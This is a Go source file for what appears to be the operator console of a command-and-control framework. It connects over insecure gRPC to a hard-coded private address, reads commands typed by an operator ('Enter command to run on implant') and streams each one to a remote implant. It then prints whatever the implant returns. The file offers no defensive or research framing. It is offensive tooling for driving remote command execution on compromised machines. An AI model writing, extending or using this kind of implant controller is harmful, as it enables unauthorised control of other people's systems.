package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"time"

	pb "github.com/bartimus-primed/proto/pb"
	"google.golang.org/grpc"
)

const (
	address     = "192.168.253.1:50551"
	defaultName = "client0"
)

var recv bool = false

func main() {

	conn, err := grpc.Dial("192.168.253.1:50551", grpc.WithInsecure())
	if err != nil {
		log.Fatalf("did not connect: %v", err)
	}
	defer conn.Close()
	c := pb.NewInteractClient(conn)

	stream, err := c.HandsOn(context.Background())
	if err != nil {
		panic(err.Error())
	}
	waitc := make(chan struct{})
	var command_to_run = ""

	go func() {
		for {
			resp, err := stream.Recv()
			if err == io.EOF {
				close(waitc)
				return
			}
			if err != nil {
				println(err)
			}
			if resp != nil {
				println("Received: ", resp.Resp)
				recv = true
				if resp.Resp == "exit" {
					stream.CloseSend()
				}
			}
		}
	}()
	for command_to_run != "exit" {
		if command_to_run != "exit" {
			fmt.Print("Enter command to run on implant: ")
			recv = false
		} else {
			stream.CloseSend()
			<-waitc
		}
		fmt.Scanln(&command_to_run)
		stream.Send(&pb.Command{
			Cmd:      command_to_run,
			Timeout:  5,
			SendResp: true,
		})
		for recv != true {
			time.Sleep(time.Second)
		}
	}
}
